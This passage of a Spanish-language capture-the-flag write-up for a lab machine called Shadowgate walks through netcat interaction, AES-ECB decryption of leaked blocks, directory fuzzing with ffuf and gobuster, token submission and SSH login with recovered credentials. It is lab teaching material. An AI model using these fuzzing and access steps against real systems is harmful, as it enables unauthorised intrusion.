+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 192.168.100.220 <span style="color:#ae81ff">56789</span>
+</span></span><span style="display:flex;"><span>Shadow Gate v1.0 :: Not all doors are locked. Some wait <span style="color:#66d9ef">for</span> n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
+</span></span><span style="display:flex;"><span>n0cturne
+</span></span><span style="display:flex;"><span>Shadow Gate v1.0 :: Not all doors are locked. Some wait <span style="color:#66d9ef">for</span> n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>YzRmN2QzNQ<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>u6wLUZqVjHq9zqkk1AUGKQ<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>Bh5flJ0ipCSwSEFszeH3JQ<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>i0xh/Dcf2rhD+aN+gTsRtg<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>7qxQxcO+lgqcUMwUs2dJdw<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>Z0ypLNpNI3eYPsHjf1cwIA<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>SFHenVqViVg4OzTZqHEqog<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>j8tFlkw7uB6pJZkeWhOKug<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>qeSKHCpwYueNcMwnC5izWg<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>Connection closing...
+</span></span></code></pre></div><p>Obtuvimos respuesta y vemos varios strings codificados en <strong>base64</strong>.</p>
+<p>Al tratar de decodificarlas, no podremos leer el contenido, ya que verás bytes crudos que nos dan a entender que los datos están cifrados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;YzRmN2QzNQ==&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>c4f7d35
+</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;u6wLUZqVjHq9zqkk1AUGKQ==&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>��
+</span></span><span style="display:flex;"><span>  Q���z�Ω$�<span style="color:#f92672">)</span>                                                                                                                                                                                              
+</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;Bh5flJ0ipCSwSEFszeH3JQ==&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>_��<span style="color:#e6db74">&#34;�</span>$<span style="color:#e6db74">�HAl���%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span></code></pre></div><p>También los podemos decodificar con la herramienta <strong>CyberChef</strong>:</p>
+<ul>
+<li><a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a></li>
+</ul>
+<p>Pruébalo:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura1.png">
+</p>
+<p>Si volvemos a conectarnos a este servicio y lo ejecutamos, nos darán distintos resultados, a excepción del primero, ya que parece que ese no cambia nunca:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;YzRmN2QzNQ==&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>c4f7d35
+</span></span></code></pre></div><p>Tomemos en cuenta esto para más adelante.</p>
+<p>Investiguemos la página web, quizá encontremos una ruta válida si aplicamos <strong>Fuzzing</strong>.</p>
+<h3 id="fuzz">Fuzzing</h3>
+<p>Primero probemos con la herramienta <strong>ffuf</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt:FUZZ -u http://192.168.100.220:8080/FUZZ -fs <span style="color:#ae81ff">213</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://192.168.100.220:8080/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span> :: Filter           : Response size: <span style="color:#ae81ff">213</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>login                   <span style="color:#f92672">[</span>Status: 200, Size: 39, Words: 7, Lines: 1, Duration: 49ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>128623/128623<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">295</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:06:52<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">1</span> ::
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-fs</em></td>
+					<td>Para aplicar un filtro que no muestre respuestas de un tamaño específico.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.100.220:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -s 200,301 -b <span style="color:#e6db74">&#34;&#34;</span> --ne
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8.2
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://192.168.100.220:8080
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:         GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,301
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.8.2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>login                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 39<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">128623</span> / <span style="color:#ae81ff">128623</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-s</em></td>
+					<td>Para aplicar un filtro que muestre solo los códigos de estado específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-b</em></td>
+					<td>Para que funcione el filtro anterior.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;ne</em></td>
+					<td>Para que no muestre errores.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Muy bien, en ambas parece que encontramos un login.</p>
+<p>Pero al entrar nos da este mensaje:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura2.png">
+</p>
+<p>Al mencionar un método incorrecto, supongo que debe ser por método <strong>POST</strong> para poder agregar un usuario y contraseña.</p>
+<p>Podemos probarlo con <strong>BurpSuite</strong>, capturando esta petición y mandándola al <strong>Repeater</strong>, pero recuerda cambiar la petición cuando la tenga en el <strong>Repeater</strong> para que se convierta
+en <strong>petición POST</strong>.</p>
+<p>Normalmente, estos datos se ponen con los parámetros <code>username=</code> y <code>password=</code>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura3.png">
+</p>
+<p>Se acepta la petición, pero el usuario es incorrecto.</p>
+<p>Ahora debemos buscar un usuario válido, pero todo parece indicar que quien oculta este dato será el servicio del <strong>puerto 56789</strong>.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="AES-ECB">Desencriptando Bloques Cifrados con AES-ECB</h3>
+<p>Investigando qué podríamos hacer con las respuestas del <strong>puerto 56789</strong>, y con ayuda de <strong>ChatGPT</strong>, encontramos lo siguiente:</p>
+<ul>
+<li>Cada cadena decodificada (a excepción de la primera) tiene un tamaño de 16 bytes.</li>
+<li>La primer cadena parece más alguna clave, un <strong>salt</strong>, un hash o un seed.</li>
+<li>La cantidad de bytes de cada cadena puede que pertenezca al <strong>cifrado AES</strong>.</li>
+<li>Si las cadenas están cifradas en <strong>AES</strong>, debemos encontrar el modo de operación para descifrarlas.</li>
+</ul>
+<p>Aquí dejo algunas definiciones importantes:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Cifrado AES</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Advanced Encryption Standard (AES) es un algoritmo de cifrado simétrico de bloque utilizado para proteger información mediante la transformación de datos en texto cifrado usando una clave secreta. Algunas de sus caracteristicas principales son: es un cifrado simétrico, opera sobre bloques de 128 bits (16 bytes), soporta claves de 128, 192 y 256 bits, etc.</em></td>
+			</tr>
+	</tbody>
+</table>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Modo de Operación de AES</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Un modo de operación define cómo aplicar un cifrado de bloque como AES a mensajes de longitud arbitraria, especificando cómo se encadenan o combinan los bloques durante el proceso de cifrado. Existen los siguientes modos: ECB (Electronic Codebook), CBC (Cipher Block Chaining) y CTR (Counter Mode)</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>No hay una forma clara de qué podamos identificar que <strong>modo de operación</strong> se utilizó, por lo que tendremos que probar algunas formas de desencriptar cada bloque en <strong>base64</strong>.</p>
+<p>Enfoquémonos en el <strong>modo de operación ECB (Electronic Codebook)</strong>.</p>
+<p>En el siguiente blog se menciona cómo desencriptar un bloque que fue encriptado con <strong>AES - ECB</strong>:</p>
+<ul>
+<li><a href="https://www.reddit.com/r/AskComputerScience/comments/1n0l1y5/how_do_you_decode_aes_ecb/" target="_blank">Reddit: How do you decode AES ECB?</a></li>
+</ul>
+<p>Para poder hacer esto, necesitaremos lo siguiente:</p>
+<ul>
+<li>La llave que se usó para encriptar el bloque, convertida en un <strong>Hash SHA256</strong>.</li>
+<li>El bloque sin que esté codificado en <strong>base64</strong>.</li>
+<li>El <strong>padding</strong>, pero esto depende de la cantidad de bytes del bloque encriptado y los que tenemos son de 16 bytes, lo que indica que no tiene <strong>padding</strong>.</li>
+</ul>
+<p>Vemos que tenemos todo, a excepción de la llave, pero como tenemos de pista que puede ser el primer bloque que encontramos, tan solo vamos a convertirla en un <strong>Hash SHA256</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;c4f7d35&#34;</span> | sha256sum
+</span></span><span style="display:flex;"><span>7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75  -
+</span></span></code></pre></div><p>Y usaremos el siguiente comando para desencriptar el bloque:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl enc -aes-256-ecb -d -K HashCopiadoSHA256 -nopad -in cadena1.bin
+</span></span></code></pre></div><p>El archivo <strong>cadena.bin</strong> almacena cualquier cadena decodificada en <strong>base64</strong>.</p>
+<p>Probemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl enc -aes-256-ecb -d -K 7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75 -nopad -in cadena1.bin
+</span></span><span style="display:flex;"><span>vI-.LGFe+WonYhS~
+</span></span></code></pre></div><p>Excelente, funcionó. Ahora desencriptemos cada cadena.</p>
+<h4 id="CyberChefPython">Desencriptando Bloques AES-ECB con CyberChef y Script de Python</h4>
+<p>Hacerlo una por una es bastante tedioso, por lo que automatizaremos la forma de desencriptar cada cadena de forma rápida.</p>
+<p>Primero usaremos <strong>CyberChef</strong>:</p>
+<ul>
+<li><a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a></li>
+</ul>
+<p>Y utilizaremos las siguientes operaciones:</p>
+<ul>
+<li><strong>Fork</strong></li>
+<li><strong>From Base64</strong></li>
+<li><strong>AES Decrypt</strong></li>
+</ul>
+<p>Quedaría de la siguiente forma:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura4.png">
+</p>
+<p>Excelente, tenemos cada cadena desencriptada.</p>
+<p>Ahora bien, aprovechando la ayuda de <strong>ChatGPT</strong>, podemos usar el siguiente script de <strong>Python</strong> para automatizar la desencriptación:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>seed <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;c4f7d35&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Llave en SHA256</span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(seed<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Crear descifrador AES ECB</span>
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_ECB)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;output.txt&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f:
+</span></span><span style="display:flex;"><span>        block <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>        ciphertext <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(block)
+</span></span><span style="display:flex;"><span>        plaintext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(ciphertext)
+</span></span><span style="display:flex;"><span>        print(plaintext)
+</span></span></code></pre></div><p>Solo necesitarás guardar todos los bloques que están en <strong>base64</strong>, a excepción del primero, que es la llave, dentro de un archivo de texto con el nombre <strong>output.txt</strong>, pero ese
+nombre se puede cambiar a tu gusto.</p>
+<p>Aparte, necesitarás tener instalada la siguiente librería:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip3 install pycryptodome
+</span></span></code></pre></div><p>Te recomiendo hacerlo en un ambiente virtual de <strong>Python</strong>.</p>
+<p>Ya solo ejecútalo y observa el resultado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 decryptAES.py
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;vI-.LGFe+WonYhS~&#39;</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;4w1[gb=w0#7@`w\\!&#39;</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;u_Ga.0&gt;?Lq~X?tO#&#39;</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#34;1&#39;t{Aa(4wJdJAh5]&#34;</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;tm:gnn8\\j}/[sf#A&#39;</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;g/i-eS}m}Bpd@9jq&#39;</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#34;x)V~LizZz6uR?M&#39;u&#34;</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;9q7ddl1l&gt;T!EX9Ln&#39;</span>
+</span></span></code></pre></div><p>En ambos casos, podemos ver que los resultados son muy distintos, pero con la diferencia importante de que el primer carácter nunca cambia.</p>
+<p>Si copiamos y pegamos cada carácter inicial dentro de la petición del login, pero como un usuario, obtendremos la siguiente respuesta:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura5.png">
+</p>
+<p>Encontramos el usuario correcto, pero nos dice que debemos encontrar una ruta donde colocar un token, que parece más un <strong>código OTP</strong> y se nos da uno como una cabecera,</p>
+<p>Tendremos que aplicar <strong>Fuzzing</strong> de nuevo.</p>
+<h3 id="fuzz2SSH">Identificando Ruta para Colocar Token y Ganando Acceso a la Máquina Víctima Vía SSH</h3>
+<p>Busquemos esa ruta con la herramienta <strong>ffuf</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt:FUZZ -X POST -u http://192.168.100.220:8080/FUZZ -mc <span style="color:#ae81ff">200</span> -H <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : POST
+</span></span><span style="display:flex;"><span> :: URL              : http://192.168.100.220:8080/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
+</span></span><span style="display:flex;"><span> :: Header           : Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>login                   <span style="color:#f92672">[</span>Status: 200, Size: 48, Words: 8, Lines: 1, Duration: 184ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>verify                  <span style="color:#f92672">[</span>Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 201ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>128370/128370<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">254</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:11:23<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-X</em></td>
+					<td>Para indicar un método específico a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-mc</em></td>
+					<td>Para indicar un filtro que solo busque resultados con un código de estado específico.</td>
+			</tr>
+			<tr>
+					<td><em>-H</em></td>
+					<td>Para indicar una cabecera específica a usar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Excelente, encontramos la ruta.</p>
+<p>Apuntemos a ella desde la petición que capturamos con <strong>BurpSuite</strong> y usemos el parámetro <code>token=</code> para ver si funciona:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura6.png">
+</p>
+<p>Sí funcionó.</p>
+<p>Dale el token correcto:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura7.png">
+</p>
+<p>Nos dicen que se activó un servicio, pero al escanear la máquina no vemos nada.</p>
+<p>Pero al entrar de nuevo al <strong>puerto 56789</strong>, obtendremos una respuesta distinta:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 192.168.100.220 <span style="color:#ae81ff">56789</span>
+</span></span><span style="display:flex;"><span>Shadow Gate v1.0 :: Not all doors are locked. Some wait <span style="color:#66d9ef">for</span> n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
+</span></span><span style="display:flex;"><span>Shadow Gate v1.0 :: Not all doors are locked. Some wait <span style="color:#66d9ef">for</span> n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
+</span></span><span style="display:flex;"><span>SSH login <span style="color:#66d9ef">for</span> user mars
+</span></span><span style="display:flex;"><span>mars:**********
+</span></span><span style="display:flex;"><span>Connection closing...
+</span></span></code></pre></div><p>Nos dio credenciales para entrar al <strong>servicio SSH</strong>.</p>
+<p>Comprobemos si funcionan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ssh 192.168.100.220 -u <span style="color:#e6db74">&#39;mars&#39;</span> -p <span style="color:#e6db74">&#39;**********&#39;</span>
+</span></span><span style="display:flex;"><span>SSH         192.168.100.220   <span style="color:#ae81ff">22</span>     192.168.100.220    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11
+</span></span><span style="display:flex;"><span>SSH         192.168.100.220   <span style="color:#ae81ff">22</span>     192.168.100.220    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> mars:**********  Linux - Shell access!
+</span></span></code></pre></div><p>Sí funcionan.</p>
+<p>Entremos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh mars@192.168.100.220
+</span></span><span style="display:flex;"><span>mars@192.168.100.220<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Last login: Tue Mar <span style="color:#ae81ff">10</span> 20:43:42 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>mars@TheHackersLabs-Shadowgate:~$ whoami
+</span></span><span style="display:flex;"><span>mars
+</span></span></code></pre></div><p>Ya estamos dentro.</p>
+<p>Aquí encontraremos la flag del usuario:</p>
